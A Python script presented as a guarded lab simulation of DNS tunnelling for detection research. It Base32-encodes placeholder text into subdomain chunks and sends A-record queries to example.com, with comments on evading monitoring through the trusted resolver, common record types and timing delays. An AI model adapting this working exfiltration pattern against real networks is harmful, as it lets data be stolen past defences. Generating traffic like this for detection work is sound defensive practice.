"""
This file provides a controlled lab simulation of DNS tunneling behavior 
to support defensive security research. By default, this script is 
disabled and must be explicitly enabled for lab testing.

It demonstrates how data may be:
- Encoded using Base32 to remain DNS-compatible
- Split into subdomain-sized chunks
- Transmitted via standard DNS queries

The implementation is intentionally minimal and exists solely to generate 
representative DNS traffic for detection testing and analysis.

All data used is hardcoded test data, and the domain `example.com` is
explicitly reserved by IANA for documentation and testing purposes.

This code should only be executed in isolated lab environments or against
domains you own or are authorized to test.
"""
# some guard rails to prevent accidental misuse
LAB_MODE = False    # must be explicitly enabled 
DRY_RUN = True      # if True, no LIVE DNS queries are sent


import base64               # use base32 to ensure all characters are DNS valid
import dns.resolver         # uses dnspython instead of raw sockets
import time                 # add delays to reduce query bursts for realism

domain = "example.com"      # test domain used for lab simulation 
chunk_size = 30             # safe DNS label size (max size is 63 chars)


# this function prepares data passed into it for DNS transport by encoding it in base32
def encode_data(data):
    encoded = base64.b32encode(data.encode()).decode().strip("=")

    # divide the resulting encoded data into chunks of 30, and return them back
    return [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

#######################################################################################################################

# this function exfiltrates the encoded message through DNS queries to the attackers domain
def send_dns_queries(chunks):

    if not DRY_RUN:
        # use system DNS resolver due to high corporate trusted infrastructure
        resolver = dns.resolver.Resolver()

    # the data to be sent is broken down into chunks, send one chunk at a time
    for chunk in chunks:

        # subdomain construction using each chunk
        subdomain = f"{chunk}.{domain}"

        # send 'A' record lookup (most common DNS query, blends in with normal traffic)
        if DRY_RUN:
            print(f"[DRY RUN] Would send: {subdomain}")

        else:
            try:
                resolver.resolve(subdomain, "A")    # live query will be sent, able to study it's PCAP
                print(f"Sent: {subdomain}")
            except Exception as e:
                print(f"[ERROR] DNS query failed: {e}")

        # attempt to mimic human traffic by setting artifical delay
        time.sleep(0.5)

#######################################################################################################################

if __name__ == "__main__":

    # guard rail
    if not LAB_MODE:
        raise RuntimeError(
            "LAB_MODE is disabled.\n"
            "Set LAB_MODE = True to proceed.\n"
            "DRY_RUN = True by default. Change it to False if you want to send out live DNS queries. Exiting."
        )

    # example placeholder data used to simulate exfiltration behavior
    data = "This_data_is_sensitive. Exfiltrate_this_data_over_DNS."
    chunks = encode_data(data)
    send_dns_queries(chunks)
